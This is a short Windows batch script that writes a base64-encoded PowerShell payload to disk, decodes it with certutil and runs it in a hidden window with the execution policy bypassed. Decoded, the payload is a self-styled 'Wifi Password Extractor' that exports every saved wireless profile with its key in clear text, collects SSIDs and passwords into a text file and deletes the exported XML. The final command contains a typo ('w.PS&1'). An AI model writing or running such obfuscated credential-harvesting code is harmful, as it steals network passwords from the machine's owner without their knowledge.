echo bmV0c2ggd2xhbiBleHBvcnQgcHJvZmlsZSBrZXk9Y2xlYXIKCmVjaG8gIldpZmkgUGFzc3dvcmQgRXh0cmFjdG9yIENvZGVkIEJ5IHMzbHVYIiA+IHByb2ZpbGVzLnR4dApkaXIgKi54bWwgfCUgewokeG1sPVt4bWxdIChnZXQtY29udGVudCAkXykKJGZpbGU9ICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tYHJgbiBTU0lEID0gIiskeG1sLldMQU5Qcm9maWxlLlNTSURDb25maWcuU1NJRC5uYW1lICsgImByYG4gUEFTUyA9ICIgKyR4bWwuV0xBTlByb2ZpbGUuTVNNLlNlY3VyaXR5LnNoYXJlZEtleS5rZXltYXRlcmlhbApPdXQtRmlsZSBwcm9maWxlcy50eHQgLUFwcGVuZCAtSW5wdXRPYmplY3QgJGZpbGUKfQpybSAqLnhtbCAtRm9yY2U= > w.txt
certutil -decode w.txt w.PS1
powershell -windowstyle hidden -ExecutionPolicy ByPass -File w.PS&1
